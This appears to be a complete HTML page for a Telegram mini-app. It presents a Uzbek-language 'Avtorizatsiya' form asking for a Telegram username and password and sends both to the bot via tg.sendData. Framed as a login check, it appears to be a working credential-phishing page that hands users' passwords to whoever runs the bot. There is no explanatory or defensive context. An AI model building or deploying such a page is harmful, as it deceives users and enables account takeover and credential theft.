<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f4f9; }
        .box { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); width: 280px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        button { background: #0088cc; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <h3>🔐 Avtorizatsiya</h3>
        <input type="text" id="u" placeholder="@username">
        <input type="password" id="p" placeholder="Parol">
        <button onclick="send()">Tasdiqlash</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        function send() {
            let user = document.getElementById("u").value;
            let pass = document.getElementById("p").value;
            if(!user || !pass) return alert("To'ldiring!");

            let result = JSON.stringify({username: user, pass: pass});
            tg.sendData(result); // MA'LUMOTNI BOTGA YUBORISH
        }
    </script>
</body>
</html>
